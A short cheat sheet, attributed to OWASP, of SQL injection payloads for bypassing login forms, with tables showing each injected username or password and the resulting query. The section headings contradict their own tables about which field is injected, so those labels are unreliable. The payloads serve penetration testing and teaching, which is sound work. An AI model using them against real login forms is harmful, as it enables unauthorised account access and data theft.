# Login Form SQL Injection Testing
Below is the cheat sheet provided by OWASP from SecHow.com. This can be used to test a username or password for simple SQL injection vulnerabilities.
## Password Injection
Below is a few simple tests that we can do to attempt SQL injection on the **username** value being sent to the server.

| Username | Password | SQL Query |
|----------|----------|-----------|
| tom | tom	| SELECT * FROM users WHERE name='tom' and password='tom' |
| tom | ' or '1'='1 | SELECT * FROM users WHERE name='tom' and password='' or '1'='1' | 
| tom | ' or 1='1 | SELECT * FROM users WHERE name='tom' and password='' or 1='1' |
| tom	| 1' or 1=1 -- - | SELECT * FROM users WHERE name='tom' and password='' or 1=1-- -' |
## Username Injection
Below is a few simple tests that we can do to attempt SQL injection on the **password** value being sent to the server.

| Username | Password | SQL Query |
|----------|----------|-----------|
| ' or '1'='1	| ' or '1'='1	| SELECT * FROM users WHERE name='' or '1'='1' and password='' or '1'='1' |
| ' or ' 1=1	| ' or ' 1=1	| SELECT * FROM users WHERE name='' or ' 1=1' and password='' or ' 1=1' |
| 1' or 1=1 -- -	| blah	| SELECT * FROM users WHERE name='1' or 1=1 -- -' and password='blah' |

## Other SQL Injection Techniques
We can also try the following techniques to attempt SQL injection,

| Username | Password |
|----------|----------|
| ' or 1=1 -- | blah | 
| blah | ' or 1=1 -- | 
